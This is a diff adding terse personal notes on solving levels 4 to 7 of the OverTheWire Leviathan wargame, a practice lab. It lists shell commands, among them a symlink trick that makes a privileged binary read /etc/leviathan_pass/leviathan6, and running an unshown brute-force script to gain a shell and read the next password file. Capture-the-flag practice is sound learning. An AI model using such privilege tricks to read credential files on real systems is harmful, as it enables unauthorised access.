@@ -44,5 +44,36 @@ ltrace ./level3 #strcmp() vuln. --> password for level 3 is simply snlprintf lol
 whoami
 cat /etc/leviathan_pass/leviathan4 #rofl
 
+# Leviathan 4 -> 5
+ssh leviathan4@leviathan.labs.overthewire.org -p 2223
+ls -al
+cd .trash
+ls -al
+file bin
+./bin
+# We get binaries, use an online converter and voila 
+
+# Leviathan 5 -> 6 
+ssh leviathan5@leviathan.labs.overthewire.org -p 2223
+ls -al
+./leviathan5
+echo "test" > /tmp.file.log
+./leviathan5
+ln -s /etc/leviathan_pass/leviathan6 /tmp/file.log
+./leviathan5 # SCORE
+
+# Leviathan 6 -> 7
+ssh leviathan6@leviathan.labs.overthewire.org -p 2223
+ls -al
+./leviathan6
+mkdir /tmp/zulu
+vim /tmp/zulu/bruteforce.sh
+cd tmp
+cd zulu
+./bruteforce.sh
+# wait a moment for shell to appear
+ls -al
+whoami
+cat /etc/leviathan_pass/leviathan7
 
  
